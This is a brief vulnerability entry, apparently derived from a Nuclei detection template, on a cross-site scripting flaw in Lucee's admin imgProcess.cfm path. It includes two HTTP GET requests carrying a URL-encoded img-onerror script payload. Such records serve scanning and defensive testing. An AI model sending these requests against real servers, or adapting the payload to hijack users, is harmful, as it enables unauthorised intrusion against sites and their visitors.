# Vulnerability: Lucee - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`lucee-xss.yaml`)

## Description
Lucee contains a cross-site scripting vulnerability. It allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm
GET {{BaseURL}}/lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm
```

